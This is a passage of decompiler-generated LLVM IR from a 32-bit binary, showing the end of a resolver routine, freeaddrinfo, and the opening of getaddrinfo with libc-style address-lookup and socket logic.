dec_label_pc_805d4d5:                             ; preds = %dec_label_pc_805d4a0
  %v1_805d4d5 = add i32 %v2_805d4aa, 24
  %v2_805d4d5 = inttoptr i32 %v1_805d4d5 to i32*
  store i32 0, i32* %v2_805d4d5, align 4
  br label %dec_label_pc_805d4dc

dec_label_pc_805d4dc:                             ; preds = %dec_label_pc_805d4ae, %dec_label_pc_805d4d5
  store i32 %stack_var_16.039, i32* %ecx.global-to-local, align 4
  %v2_805d4df = load i32, i32* %v2_805d3c6, align 4
  store i32 %v2_805d4df, i32* %eax.global-to-local, align 4
  %v1_805d4e1 = add i32 %v2_805d4df, 28
  %v2_805d4e1 = inttoptr i32 %v1_805d4e1 to i32*
  store i32 0, i32* %v2_805d4e1, align 4
  %v0_805d4e8 = load i32, i32* %ecx.global-to-local, align 4
  %v1_805d4e8 = inttoptr i32 %v0_805d4e8 to i32*
  %v2_805d4e8 = load i32, i32* %v1_805d4e8, align 4
  %v1_805d4ea = add i32 %v2_805d4e8, 28
  store i32 %v1_805d4ea, i32* %eax.global-to-local, align 4
  %v0_805d4f0 = load i32, i32* @esi, align 4
  %v1_805d4f0 = inttoptr i32 %v0_805d4f0 to i32*
  %storemerge9 = load i32, i32* %v1_805d4f0, align 4
  store i32 %storemerge9, i32* @esi, align 4
  %v1_805d4f2 = icmp eq i32 %storemerge9, 0
  %v1_805d4f4 = icmp eq i1 %v1_805d4f2, false
  br i1 %v1_805d4f4, label %dec_label_pc_805d3a3, label %dec_label_pc_805d4f2.dec_label_pc_805d4fa_crit_edge

dec_label_pc_805d4f2.dec_label_pc_805d4fa_crit_edge: ; preds = %dec_label_pc_805d4dc
  %v0_805d4fa.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_805d4fa

dec_label_pc_805d4fa:                             ; preds = %dec_label_pc_805d4f2.dec_label_pc_805d4fa_crit_edge, %dec_label_pc_805d39b
  %v0_805d4fa = phi i32 [ %v0_805d4fa.pre, %dec_label_pc_805d4f2.dec_label_pc_805d4fa_crit_edge ], [ %v0_805d364, %dec_label_pc_805d39b ]
  %stack_var_16.0.lcssa = phi i32 [ %v1_805d4ea, %dec_label_pc_805d4f2.dec_label_pc_805d4fa_crit_edge ], [ %stack_var_16.150, %dec_label_pc_805d39b ]
  %v1_805d4fa = inttoptr i32 %v0_805d4fa to i32*
  %v2_805d4fa = load i32, i32* %v1_805d4fa, align 4
  store i32 %v2_805d4fa, i32* @edi, align 4
  %v1_805d4fc = icmp eq i32 %v2_805d4fa, 0
  %v1_805d4fe = icmp eq i1 %v1_805d4fc, false
  br i1 %v1_805d4fe, label %dec_label_pc_805d28f, label %dec_label_pc_805d534

dec_label_pc_805d506:                             ; preds = %dec_label_pc_805cd4f, %dec_label_pc_805cc63, %dec_label_pc_805cc87
  store i32 264, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805d536

dec_label_pc_805d50d:                             ; preds = %dec_label_pc_805cf14, %dec_label_pc_805ce88
  store i32 6, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805d536

dec_label_pc_805d514:                             ; preds = %dec_label_pc_805d33f, %dec_label_pc_805d1b8, %dec_label_pc_805cf6a
  store i32 258, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805d536

dec_label_pc_805d51b:                             ; preds = %dec_label_pc_805d30a, %dec_label_pc_805d109, %dec_label_pc_805cfff
  %v0_805d51b = call i32 @__GI___h_errno_location()
  %v1_805d520 = inttoptr i32 %v0_805d51b to i32*
  store i32 -1, i32* %v1_805d520, align 4
  store i32 11, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805d536

dec_label_pc_805d52d:                             ; preds = %dec_label_pc_805d3a3
  store i32 10, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805d536

dec_label_pc_805d534:                             ; preds = %dec_label_pc_805d4fa, %dec_label_pc_805d27d, %dec_label_pc_805d273
  store i32 0, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805d536

dec_label_pc_805d536:                             ; preds = %dec_label_pc_805cd2e, %dec_label_pc_805cca1, %dec_label_pc_805d1a0, %dec_label_pc_805cc63, %dec_label_pc_805d52d, %dec_label_pc_805d51b, %dec_label_pc_805d514, %dec_label_pc_805d50d, %dec_label_pc_805d506, %dec_label_pc_805d1ae, %dec_label_pc_805d534
  %v0_805d53d = phi i32 [ %v2_805ccb9, %dec_label_pc_805cca1 ], [ 3, %dec_label_pc_805d1a0 ], [ 263, %dec_label_pc_805cc63 ], [ 10, %dec_label_pc_805d52d ], [ 11, %dec_label_pc_805d51b ], [ 258, %dec_label_pc_805d514 ], [ 6, %dec_label_pc_805d50d ], [ 264, %dec_label_pc_805d506 ], [ 259, %dec_label_pc_805d1ae ], [ 0, %dec_label_pc_805d534 ], [ %v2_805cd22, %dec_label_pc_805cd2e ]
  store i32 %v0_805cbb4, i32* %ebx.global-to-local, align 4
  ret i32 %v0_805d53d

; uselistorder directives
  uselistorder i32 %v2_805d4fa, { 1, 2, 0 }
  uselistorder i32 %v1_805d4ea, { 0, 2, 1 }
  uselistorder i32 %v2_805d4aa, { 2, 1, 0, 3 }
  uselistorder i32* %v2_805d3c6, { 4, 0, 3, 2, 1, 5 }
  uselistorder i32 %v2_805d3b7, { 0, 2, 1, 3 }
  uselistorder i32 %stack_var_16.039, { 6, 7, 5, 4, 3, 2, 0, 1 }
  uselistorder i16* %v4_805d481, { 1, 0 }
  uselistorder i32 %v1_805d3b717, { 2, 4, 3, 5, 0, 1 }
  uselistorder i16 %storemerge11, { 1, 0, 2 }
  uselistorder i32 %storemerge15, { 1, 3, 2, 4, 0 }
  uselistorder i1 %v4_805d36a, { 1, 0 }
  uselistorder i32 %stack_var_-140.0, { 1, 0 }
  uselistorder i32 %stack_var_-132.0, { 2, 3, 4, 1, 0 }
  uselistorder i8* %v3_805d34f, { 1, 0 }
  uselistorder i32 %v2_805d2ed, { 1, 0, 2, 3 }
  uselistorder i32 %v2_805d2c5, { 0, 1, 2, 3, 4, 5, 6, 8, 7 }
  uselistorder i32 %v1_805d2b6, { 2, 0, 1, 3, 4, 5 }
  uselistorder i32 %v2_805d2b1, { 1, 0 }
  uselistorder i32 %v0_805d2b3, { 1, 0 }
  uselistorder i32 %v1_805d236, { 1, 0, 2 }
  uselistorder i32 %v2_805d177, { 1, 0 }
  uselistorder i32 %v0_805d121, { 1, 2, 0, 3 }
  uselistorder i32 %v3_805d0fd, { 1, 0 }
  uselistorder i32 %v2_805d0cb, { 1, 0 }
  uselistorder i32 %v3_805d099, { 1, 0, 2 }
  uselistorder i32 %v0_805d084.pre, { 1, 0 }
  uselistorder i32 %v2_805d07c, { 1, 0 }
  uselistorder i32 %v0_805d020, { 1, 2, 0, 3 }
  uselistorder i32 %v3_805cff3, { 1, 0 }
  uselistorder i32 %v2_805cfc1, { 1, 0 }
  uselistorder i32 %v1_805cf31, { 1, 0, 2 }
  uselistorder i1 %v2_805cee8, { 1, 0 }
  uselistorder i32 %v4_805cede, { 2, 3, 0, 5, 1, 4, 6 }
  uselistorder i32 %v5_805ced2, { 1, 0, 2 }
  uselistorder i32 %v3_805ceb2, { 1, 0 }
  uselistorder i32 %v4_805ce68, { 3, 4, 0, 1, 2 }
  uselistorder i32 %v1_805ce64, { 3, 4, 0, 1, 2, 5, 6 }
  uselistorder i32 %v8_805ce40, { 1, 0 }
  uselistorder i32 %v1_805ce22, { 1, 0 }
  uselistorder i32 %v0_805ce22199, { 0, 3, 1, 2 }
  uselistorder i32 %v8_805cdbd, { 1, 0, 2, 3 }
  uselistorder i32 %v8_805cd67, { 1, 0, 2, 3 }
  uselistorder i32 %v1_805cd46, { 1, 0 }
  uselistorder i8 %v3_805ccdc, { 1, 0, 2 }
  uselistorder i32 %stack_var_-152.161, { 5, 4, 3, 0, 1, 2 }
  uselistorder i32 %v0_805cdc9, { 0, 2, 1, 3, 5, 4, 6, 7, 8 }
  uselistorder i32 %v3_805cc3a, { 2, 0, 3, 4, 1 }
  uselistorder i32 %v0_805cc27206, { 0, 5, 4, 3, 2, 1 }
  uselistorder i32* %v2_805cc3a.pre-phi, { 1, 0 }
  uselistorder i1 %v1_805cc11, { 1, 2, 0 }
  uselistorder i32 %v1_805cbf1, { 1, 0 }
  uselistorder i32* %v2_805cbce, { 5, 6, 0, 4, 1, 3, 2, 7 }
  uselistorder i32* %stack_var_-176, { 3, 0, 6, 4, 7, 5, 8, 2, 9, 1, 10 }
  uselistorder i32* %stack_var_-20, { 2, 0, 1, 3, 4, 5, 6, 7, 8, 9, 12, 10, 11 }
  uselistorder i8** %stack_var_-252, { 3, 2, 4, 5, 9, 8, 7, 6, 0, 1 }
  uselistorder i8** %stack_var_-32, { 12, 11, 5, 0, 10, 9, 4, 1, 8, 7, 3, 6, 2 }
  uselistorder i32* %stack_var_-24, { 0, 1, 2, 3, 4, 5, 6, 7, 20, 21, 22, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19 }
  uselistorder i32* %stack_var_-28, { 2, 3, 6, 0, 4, 7, 1, 5, 8 }
  uselistorder i8** %stack_var_4, { 5, 4, 3, 0, 2, 1, 6 }
  uselistorder i8** %stack_var_-148, { 4, 3, 5, 2, 0, 1 }
  uselistorder i32* %edx.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 51, 52, 21, 22, 23, 24, 25, 27, 26, 0, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 53, 49, 50 }
  uselistorder i32* %eax.global-to-local, { 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 20, 21, 22, 31, 17, 18, 19, 23, 24, 25, 26, 27, 28, 29, 30, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 59, 60, 61, 80, 72, 73, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 1, 148, 74, 75, 76, 77, 149, 78, 79, 91, 92, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 0, 147, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 58, 120, 121, 122, 123, 124, 125, 128, 126, 127, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 146 }
  uselistorder i32 264, { 1, 3, 0, 2 }
  uselistorder i8* bitcast (i32* @0 to i8*), { 0, 4, 1, 2, 3, 5, 6 }
  uselistorder i32 -33, { 1, 0, 2, 3 }
  uselistorder i32 ()* @gethostbyname2_r, { 1, 0 }
  uselistorder i32 %arg3, { 20, 21, 19, 13, 14, 15, 16, 17, 18, 22, 23, 24, 25, 5, 6, 7, 8, 9, 10, 12, 11, 26, 27, 28, 0, 3, 4, 1, 2, 29, 30, 31, 32, 33, 34 }
  uselistorder i32 %arg2, { 0, 1, 3, 2, 4 }
  uselistorder label %dec_label_pc_805d536, { 10, 4, 5, 6, 7, 8, 9, 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_805d506, { 0, 2, 1 }
  uselistorder label %dec_label_pc_805d4dc, { 1, 0 }
  uselistorder label %dec_label_pc_805d4a0, { 1, 0 }
  uselistorder label %dec_label_pc_805d45b, { 1, 0 }
  uselistorder label %dec_label_pc_805d3a3, { 1, 0 }
  uselistorder label %dec_label_pc_805d364, { 1, 0 }
  uselistorder label %dec_label_pc_805d33f, { 1, 0 }
  uselistorder label %dec_label_pc_805d28f, { 1, 0 }
  uselistorder label %dec_label_pc_805d273, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_805d24e, { 1, 0 }
  uselistorder label %dec_label_pc_805d249, { 1, 0 }
  uselistorder label %dec_label_pc_805d211, { 1, 0 }
  uselistorder label %dec_label_pc_805d1b8, { 4, 5, 1, 0, 3, 2, 6, 7 }
  uselistorder label %dec_label_pc_805d193, { 1, 0 }
  uselistorder label %dec_label_pc_805d14e, { 1, 0 }
  uselistorder label %dec_label_pc_805d136, { 1, 0 }
  uselistorder label %dec_label_pc_805d109, { 1, 0 }
  uselistorder label %dec_label_pc_805d096, { 2, 0, 1 }
  uselistorder label %dec_label_pc_805d094, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_805d053, { 1, 0 }
  uselistorder label %dec_label_pc_805d03b, { 1, 0 }
  uselistorder label %dec_label_pc_805cfff, { 1, 0 }
  uselistorder label %dec_label_pc_805ceef, { 1, 0 }
  uselistorder label %dec_label_pc_805ce9f, { 1, 0 }
  uselistorder label %dec_label_pc_805ce2f, { 1, 0, 4, 5, 2, 3 }
  uselistorder label %dec_label_pc_805cdfe, { 1, 0 }
  uselistorder label %dec_label_pc_805cde7, { 1, 0 }
  uselistorder label %dec_label_pc_805cd91, { 1, 0 }
  uselistorder label %dec_label_pc_805cd46, { 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_805ccdc, { 1, 0 }
  uselistorder label %dec_label_pc_805cc7f, { 1, 0 }
  uselistorder label %dec_label_pc_805cc37, { 1, 0 }
  uselistorder label %dec_label_pc_805cc2a.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_805cbfa, { 1, 0 }
}

define i32 @freeaddrinfo(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  %tmp18 = call i32 @__decompiler_undefined_function_0()
  store i32 %tmp18, i32* %stack_var_-12, align 4
  %v1_805d5592 = icmp eq i32 %arg1, 0
  %v1_805d55b9 = icmp eq i1 %v1_805d5592, false
  br i1 %v1_805d55b9, label %dec_label_pc_805d548.lr.ph, label %dec_label_pc_805d55d

dec_label_pc_805d548.lr.ph:                       ; preds = %entry
  br label %dec_label_pc_805d548

dec_label_pc_805d548:                             ; preds = %dec_label_pc_805d548.lr.ph, %dec_label_pc_805d548
  %v0_805d54b = phi i32 [ %arg1, %dec_label_pc_805d548.lr.ph ], [ %v0_805d554, %dec_label_pc_805d548 ]
  %v1_805d54b = add i32 %v0_805d54b, 28
  %v2_805d54b = inttoptr i32 %v1_805d54b to i32*
  %v3_805d54b = load i32, i32* %v2_805d54b, align 4
  store i32 %v3_805d54b, i32* @ebx, align 4
  %v1_805d54f = call i32 @free(i32 %v0_805d54b)
  %v0_805d554 = load i32, i32* @ebx, align 4
  %v1_805d559 = icmp eq i32 %v0_805d554, 0
  %v1_805d55b = icmp eq i1 %v1_805d559, false
  br i1 %v1_805d55b, label %dec_label_pc_805d548, label %dec_label_pc_805d559.dec_label_pc_805d55d_crit_edge

dec_label_pc_805d559.dec_label_pc_805d55d_crit_edge: ; preds = %dec_label_pc_805d548
  %v2_805d55d.pre = load i32, i32* %stack_var_-12, align 4
  br label %dec_label_pc_805d55d

dec_label_pc_805d55d:                             ; preds = %dec_label_pc_805d559.dec_label_pc_805d55d_crit_edge, %entry
  %v2_805d55d = phi i32 [ %v2_805d55d.pre, %dec_label_pc_805d559.dec_label_pc_805d55d_crit_edge ], [ %tmp18, %entry ]
  ret i32 %v2_805d55d

; uselistorder directives
  uselistorder i32 %v0_805d54b, { 1, 0 }
  uselistorder label %dec_label_pc_805d548, { 1, 0 }
}

define i32 @getaddrinfo(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  %stack_var_-32 = alloca i8*, align 4
  %stack_var_-24 = alloca i8*, align 4
  %stack_var_-64 = alloca i32, align 4
  %v0_805d561 = load i32, i32* @ebp, align 4
  %v0_805d562 = load i32, i32* @edi, align 4
  %v0_805d563 = load i32, i32* @esi, align 4
  %v0_805d564 = load i32, i32* @ebx, align 4
  store i32 %arg2, i32* @esi, align 4
  store i32 %arg3, i32* @edi, align 4
  store i32 0, i32* %stack_var_-20, align 4
  %v4_805d578 = ptrtoint i8* %arg1 to i32
  %v5_805d578 = icmp eq i8* %arg1, null
  br i1 %v5_805d578, label %dec_label_pc_805d598, label %dec_label_pc_805d57f

dec_label_pc_805d57f:                             ; preds = %entry
  store i32 %v4_805d578, i32* %eax.global-to-local, align 4
  %v2_805d583 = load i8, i8* %arg1, align 1
  %v11_805d583 = icmp eq i8 %v2_805d583, 42
  %v1_805d586 = icmp eq i1 %v11_805d583, false
  br i1 %v1_805d586, label %dec_label_pc_805d598, label %dec_label_pc_805d588

dec_label_pc_805d588:                             ; preds = %dec_label_pc_805d57f
  %v1_805d588 = add i32 %v4_805d578, 1
  %v2_805d588 = inttoptr i32 %v1_805d588 to i8*
  %v3_805d588 = load i8, i8* %v2_805d588, align 1
  %v4_805d588 = icmp eq i8 %v3_805d588, 0
  %v1_805d58c = icmp eq i1 %v4_805d588, false
  %v1_805d592 = sext i1 %v1_805d58c to i32
  store i32 %v1_805d592, i32* %eax.global-to-local, align 4
  %v17_805d594 = select i1 %v1_805d58c, i8* %arg1, i8* null
  br label %dec_label_pc_805d598

dec_label_pc_805d598:                             ; preds = %dec_label_pc_805d57f, %entry, %dec_label_pc_805d588
  %v3_805d5e3 = phi i8* [ %arg1, %dec_label_pc_805d57f ], [ null, %entry ], [ %v17_805d594, %dec_label_pc_805d588 ]
  %v1_805d598 = icmp eq i32 %arg2, 0
  br i1 %v1_805d598, label %dec_label_pc_805d5ae, label %dec_label_pc_805d59c

dec_label_pc_805d59c:                             ; preds = %dec_label_pc_805d598
  %v1_805d59c = inttoptr i32 %arg2 to i8*
  %v2_805d59c = load i8, i8* %v1_805d59c, align 1
  %v11_805d59c = icmp eq i8 %v2_805d59c, 42
  %v1_805d59f = icmp eq i1 %v11_805d59c, false
  br i1 %v1_805d59f, label %dec_label_pc_805d5ae, label %dec_label_pc_805d5a1

dec_label_pc_805d5a1:                             ; preds = %dec_label_pc_805d59c
  store i32 0, i32* %eax.global-to-local, align 4
  %v1_805d5a3 = add i32 %arg2, 1
  %v2_805d5a3 = inttoptr i32 %v1_805d5a3 to i8*
  %v3_805d5a3 = load i8, i8* %v2_805d5a3, align 1
  %v4_805d5a3 = icmp eq i8 %v3_805d5a3, 0
  %v1_805d5a7 = icmp eq i1 %v4_805d5a3, false
  %v1_805d5aa = sext i1 %v1_805d5a7 to i32
  store i32 %v1_805d5aa, i32* %eax.global-to-local, align 4
  %v2_805d5ac = select i1 %v1_805d5a7, i32 %arg2, i32 0
  store i32 %v2_805d5ac, i32* @esi, align 4
  br label %dec_label_pc_805d5ae

dec_label_pc_805d5ae:                             ; preds = %dec_label_pc_805d59c, %dec_label_pc_805d598, %dec_label_pc_805d5a1
  %v1_805d5b2 = phi i32 [ %arg2, %dec_label_pc_805d59c ], [ 0, %dec_label_pc_805d598 ], [ %v2_805d5ac, %dec_label_pc_805d5a1 ]
  %v4_805d5ae = ptrtoint i8* %v3_805d5e3 to i32
  %v2_805d5b2 = or i32 %v1_805d5b2, %v4_805d5ae
  %v3_805d5b2 = icmp eq i32 %v2_805d5b2, 0
  br i1 %v3_805d5b2, label %dec_label_pc_805d7db, label %dec_label_pc_805d5ba

dec_label_pc_805d5ba:                             ; preds = %dec_label_pc_805d5ae
  %v1_805d5ba = icmp eq i32 %arg3, 0
  %v1_805d5bc = icmp eq i1 %v1_805d5ba, false
  br i1 %v1_805d5bc, label %dec_label_pc_805d5d2, label %dec_label_pc_805d5be

dec_label_pc_805d5be:                             ; preds = %dec_label_pc_805d5ba
  %v2_805d5c3 = ptrtoint i32* %stack_var_-64 to i32
  store i32 %v2_805d5c3, i32* @ebx, align 4
  %tmp119 = bitcast i32* %stack_var_-64 to i8*
  store i32 %v2_805d5c3, i32* @edi, align 4
  %v6_805d5ca = call i32 @__GI_memset(i8* %tmp119, i32 0, i32 32)
  store i32 %v6_805d5ca, i32* %eax.global-to-local, align 4
  %v0_805d5d2.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_805d5d2

dec_label_pc_805d5d2:                             ; preds = %dec_label_pc_805d5ba, %dec_label_pc_805d5be
  %v0_805d5d2 = phi i32 [ %arg3, %dec_label_pc_805d5ba ], [ %v0_805d5d2.pre, %dec_label_pc_805d5be ]
  %v1_805d5d2 = inttoptr i32 %v0_805d5d2 to i32*
  %v2_805d5d2 = load i32, i32* %v1_805d5d2, align 4
  store i32 %v2_805d5d2, i32* %eax.global-to-local, align 4
  %v1_805d5d4 = and i32 %v2_805d5d2, -1088
  %v2_805d5d4 = icmp eq i32 %v1_805d5d4, 0
  %v1_805d5d9 = icmp eq i1 %v2_805d5d4, false
  br i1 %v1_805d5d9, label %dec_label_pc_805d7e2, label %dec_label_pc_805d5df

dec_label_pc_805d5df:                             ; preds = %dec_label_pc_805d5d2
  %v2_805d5df = and i32 %v2_805d5d2, 2
  %v3_805d5df = icmp eq i32 %v2_805d5df, 0
  br i1 %v3_805d5df, label %dec_label_pc_805d5ee, label %dec_label_pc_805d5e3

dec_label_pc_805d5e3:                             ; preds = %dec_label_pc_805d5df
  %v5_805d5e3 = icmp eq i8* %v3_805d5e3, null
  br i1 %v5_805d5e3, label %dec_label_pc_805d7e2, label %dec_label_pc_805d5ee

dec_label_pc_805d5ee:                             ; preds = %dec_label_pc_805d5e3, %dec_label_pc_805d5df
  %v0_805d5ee = load i32, i32* @esi, align 4
  %v1_805d5ee = icmp eq i32 %v0_805d5ee, 0
  br i1 %v1_805d5ee, label %dec_label_pc_805d661, label %dec_label_pc_805d5f2

dec_label_pc_805d5f2:                             ; preds = %dec_label_pc_805d5ee
  %v1_805d5f2 = inttoptr i32 %v0_805d5ee to i8*
  %v2_805d5f2 = load i8, i8* %v1_805d5f2, align 1
  %v3_805d5f2 = icmp eq i8 %v2_805d5f2, 0
  br i1 %v3_805d5f2, label %dec_label_pc_805d661, label %dec_label_pc_805d5f7

dec_label_pc_805d5f7:                             ; preds = %dec_label_pc_805d5f2
  store i8* %v1_805d5f2, i8** %stack_var_-32, align 4
  %v4_805d5fb = ptrtoint i32* %stack_var_-64 to i32
  %v2_805d5fe = ptrtoint i8** %stack_var_-24 to i32
  store i32 %v2_805d5fe, i32* %eax.global-to-local, align 4
  %v6_805d604 = call i32 @strtoul(i32 %v0_805d5ee, i32 %v2_805d5fe, i32 10, i32 %v4_805d5fb)
  %v3_805d610 = load i8*, i8** %stack_var_-24, align 4
  %v4_805d610 = ptrtoint i8* %v3_805d610 to i32
  store i32 %v4_805d610, i32* %eax.global-to-local, align 4
  %v2_805d614 = load i8, i8* %v3_805d610, align 1
  %v3_805d614 = icmp eq i8 %v2_805d614, 0
  %v0_805d63a = load i32, i32* @edi, align 4
  br i1 %v3_805d614, label %dec_label_pc_805d63a, label %dec_label_pc_805d619

dec_label_pc_805d619:                             ; preds = %dec_label_pc_805d5f7
  %v1_805d619 = inttoptr i32 %v0_805d63a to i32*
  %v2_805d619 = load i32, i32* %v1_805d619, align 4
  %v1_805d61b = and i32 %v2_805d619, 1024
  %v2_805d61b = icmp eq i32 %v1_805d61b, 0
  store i32 %v1_805d61b, i32* %eax.global-to-local, align 4
  %v1_805d622 = icmp eq i1 %v2_805d61b, false
  br i1 %v1_805d622, label %dec_label_pc_805d7db, label %dec_label_pc_805d628

dec_label_pc_805d628:                             ; preds = %dec_label_pc_805d619
  %v2_805d628 = ptrtoint i8** %stack_var_-32 to i32
  store i32 %v2_805d628, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805d661

dec_label_pc_805d63a:                             ; preds = %dec_label_pc_805d5f7
  %v1_805d63a = add i32 %v0_805d63a, 8
  %v2_805d63a = inttoptr i32 %v1_805d63a to i32*
  %v3_805d63a = load i32, i32* %v2_805d63a, align 4
  %v4_805d63a = icmp eq i32 %v3_805d63a, 0
  %v1_805d63e = icmp eq i1 %v4_805d63a, false
  br i1 %v1_805d63e, label %dec_label_pc_805d64f, label %dec_label_pc_805d640

dec_label_pc_805d640:                             ; preds = %dec_label_pc_805d63a
  store i32 -8, i32* %eax.global-to-local, align 4
  %v1_805d645 = add i32 %v0_805d63a, 12
  %v2_805d645 = inttoptr i32 %v1_805d645 to i32*
  %v3_805d645 = load i32, i32* %v2_805d645, align 4
  %v4_805d645 = icmp eq i32 %v3_805d645, 0
  br i1 %v4_805d645, label %dec_label_pc_805d7e5, label %dec_label_pc_805d64f

dec_label_pc_805d64f:                             ; preds = %dec_label_pc_805d640, %dec_label_pc_805d63a
  br label %dec_label_pc_805d661

dec_label_pc_805d661:                             ; preds = %dec_label_pc_805d5ee, %dec_label_pc_805d5f2, %dec_label_pc_805d64f, %dec_label_pc_805d628
  %v0_805d69a.pre91 = phi i32 [ %v0_805d63a, %dec_label_pc_805d64f ], [ %v0_805d63a, %dec_label_pc_805d628 ], [ %v0_805d5d2, %dec_label_pc_805d5f2 ], [ %v0_805d5d2, %dec_label_pc_805d5ee ]
  %v4_805d669 = icmp eq i32 %arg4, 0
  br i1 %v4_805d669, label %dec_label_pc_805d678, label %dec_label_pc_805d670

dec_label_pc_805d670:                             ; preds = %dec_label_pc_805d661
  %v2_805d670 = ptrtoint i32* %stack_var_-20 to i32
  store i32 %v2_805d670, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805d678

dec_label_pc_805d678:                             ; preds = %dec_label_pc_805d661, %dec_label_pc_805d670
  %stack_var_-80.0 = phi i32 [ 0, %dec_label_pc_805d661 ], [ %v2_805d670, %dec_label_pc_805d670 ]
  store i32 ptrtoint (i32* @global_var_806da40.754 to i32), i32* @ebp, align 4
  %v3_805d78f2152 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_806da40.754 to i32), i32 4) to i32*), align 4
  %v4_805d78f2253 = icmp eq i32 %v3_805d78f2152, 0
  %v1_805d7932960 = icmp eq i1 %v4_805d78f2253, false
  br i1 %v1_805d7932960, label %dec_label_pc_805d69a.lr.ph.lr.ph, label %dec_label_pc_805d799.thread

dec_label_pc_805d799.thread:                      ; preds = %dec_label_pc_805d678
  store i32 -6, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805d7e5

dec_label_pc_805d69a.lr.ph.lr.ph:                 ; preds = %dec_label_pc_805d678
  br label %dec_label_pc_805d69a.lr.ph

dec_label_pc_805d69a:                             ; preds = %dec_label_pc_805d69a.lr.ph, %dec_label_pc_805d74c
  %v0_805d69d = phi i32 [ %v0_805d69d82, %dec_label_pc_805d69a.lr.ph ], [ %v0_805d750, %dec_label_pc_805d74c ]
  %stack_var_-80.232 = phi i32 [ %stack_var_-80.2.ph64, %dec_label_pc_805d69a.lr.ph ], [ %v0_805d750, %dec_label_pc_805d74c ]
  %v0_805d6ac = phi i32 [ %v0_805d69a.pre, %dec_label_pc_805d69a.lr.ph ], [ %v0_805d741, %dec_label_pc_805d74c ]
  %stack_var_-88.130 = phi i32 [ %stack_var_-88.1.ph63, %dec_label_pc_805d69a.lr.ph ], [ %v0_805d73b, %dec_label_pc_805d74c ]
  %v1_805d69a = add i32 %v0_805d6ac, 4
  %v2_805d69a = inttoptr i32 %v1_805d69a to i32*
  %v3_805d69a = load i32, i32* %v2_805d69a, align 4
  %v1_805d69d = inttoptr i32 %v0_805d69d to i32*
  %v2_805d69d = load i32, i32* %v1_805d69d, align 4
  store i32 %v2_805d69d, i32* %eax.global-to-local, align 4
  %v12_805d6a0 = icmp eq i32 %v3_805d69a, %v2_805d69d
  br i1 %v12_805d6a0, label %dec_label_pc_805d6ac, label %dec_label_pc_805d6a4

dec_label_pc_805d6a4:                             ; preds = %dec_label_pc_805d69a
  %v1_805d6a4 = icmp eq i32 %v3_805d69a, 0
  %v1_805d6a6 = icmp eq i1 %v1_805d6a4, false
  br i1 %v1_805d6a6, label %dec_label_pc_805d78c, label %dec_label_pc_805d6ac

dec_label_pc_805d6ac:                             ; preds = %dec_label_pc_805d6a4, %dec_label_pc_805d69a
  %v1_805d6ac = inttoptr i32 %v0_805d6ac to i8*
  %v2_805d6ac = load i8, i8* %v1_805d6ac, align 1
  %v3_805d6ac = and i8 %v2_805d6ac, 32
  %v4_805d6ac = icmp eq i8 %v3_805d6ac, 0
  br i1 %v4_805d6ac, label %dec_label_pc_805d711, label %dec_label_pc_805d6b1

dec_label_pc_805d6b1:                             ; preds = %dec_label_pc_805d6ac
  store i32 %v2_805d69d, i32* @esi, align 4
  %v1_805d6b3 = call i32 @__errno_location(i32 0)
  store i32 %v1_805d6b3, i32* %eax.global-to-local, align 4
  %v0_805d6b8 = load i32, i32* @esi, align 4
  %v1_805d6b8 = trunc i32 %v0_805d6b8 to i16
  %v10_805d6b8 = icmp eq i16 %v1_805d6b8, 2
  store i32 %v1_805d6b3, i32* @ebx, align 4
  %v1_805d6be = inttoptr i32 %v1_805d6b3 to i32*
  %v2_805d6be = load i32, i32* %v1_805d6be, align 4
  br i1 %v10_805d6b8, label %dec_label_pc_805d702, label %dec_label_pc_805d6c6

dec_label_pc_805d6c6:                             ; preds = %dec_label_pc_805d6b1
  %v10_805d6c6 = icmp eq i16 %v1_805d6b8, 10
  store i32 2, i32* %eax.global-to-local, align 4
  br i1 %v10_805d6c6, label %dec_label_pc_805d707, label %dec_label_pc_805d6d1

dec_label_pc_805d6d1:                             ; preds = %dec_label_pc_805d6c6
  %v1_805d6d1 = urem i32 %v0_805d6b8, 65536
  store i32 %v1_805d6d1, i32* %eax.global-to-local, align 4
  %v5_805d6da = call i32 @socket(i32 %v1_805d6d1, i32 2, i32 0)
  store i32 %v5_805d6da, i32* %eax.global-to-local, align 4
  %v2_805d6e2 = icmp slt i32 %v5_805d6da, 0
  %v1_805d6e4 = icmp eq i1 %v2_805d6e2, false
  br i1 %v1_805d6e4, label %dec_label_pc_805d6ef, label %dec_label_pc_805d6e6

dec_label_pc_805d6e6:                             ; preds = %dec_label_pc_805d6d1
